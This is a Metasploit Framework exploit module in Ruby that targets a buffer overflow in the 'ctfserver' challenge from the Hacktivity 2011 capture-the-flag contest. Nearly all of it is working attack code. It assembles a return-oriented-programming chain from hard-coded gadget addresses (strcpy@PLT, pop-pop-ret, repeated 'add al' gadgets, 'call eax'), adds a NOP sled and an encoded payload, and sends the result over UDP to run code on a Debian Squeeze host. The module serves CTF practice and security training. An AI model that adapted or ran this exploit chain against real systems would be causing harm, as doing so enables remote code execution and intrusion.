##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Hacktivity 2011 CtF ctfserver buffer overflow',
			'Description'	=> %q{
					This module exploits the vulnerability in one of the Hacktivity 2011 
					Capture the Flag challenges. 
			},
			'License'		=> MSF_LICENSE,
			'Author'		=> 
				[
					'mr.schyte',
					'soyer',
					'sghctoma',	
				],
			'Version'		=> '$Revision:$',
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Platform'	=> 'linux',
			'Payload'	=>
				{
					'Space' => 550,
					'BadChars' => "\x00\x0a",
				},

			'Targets'		=>
				[
					[ 'Debian Squeeze',
						{
							'Offset'	=>	44,
						}
					],
				],
			'Privileged'	=> false,
			'DisclosureDate'	=> 'September 18 2011',
			'DefaultTarget'	=> 0))

		register_options([Opt::RPORT(2011)], self.class)

	end

	def exploit

		connect_udp

		buffer = "STRCPYT "
		buffer << rand_text_alpha_upper(target['Offset'])
		
		buffer << [0x080487ec].pack("V")	# strcpy@PLT
		buffer << [0x08048942].pack("V")	# pop # pop # ret
		buffer << [0x0804a7bc].pack("V")	# target address
		buffer << [0x080485b4].pack("V")	# pointer to byte
		#---------------------------------
		buffer << [0x080487ec].pack("V")	# strcpy@PLT
		buffer << [0x08048942].pack("V")	# pop # pop # ret
		buffer << [0x0804a7bd].pack("V")	# target address
		buffer << [0x080488c6].pack("V")	# pointer to byte
		#---------------------------------
		
		#buffer << [0x08048942].pack("V")	# pop ebx # pop ebp # ret
		#buffer << [0xaaa9a2f8].pack("V")	# popped into ebx to make it 
							# point to a valid memory 
							# location in the following 
							# gadget
		#buffer << "JUNK"			# JUNK
	
		# adjusting eax to make it point to our \xff\xe4
		for i in 0..44 do
			buffer << [0x08048941].pack("V") # add al, 0x5b # pop ebp # ret
			buffer << "JUNK"		  # JUNK;
		end

		buffer << [0x0804896f].pack("V")	# call eax # leave # ret

		buffer << make_nops(10)
		buffer << payload.encoded
		
		print_status("Trying target #{target.name}...")
		udp_sock.put(buffer)

		handler
		disconnect_udp

	end
end
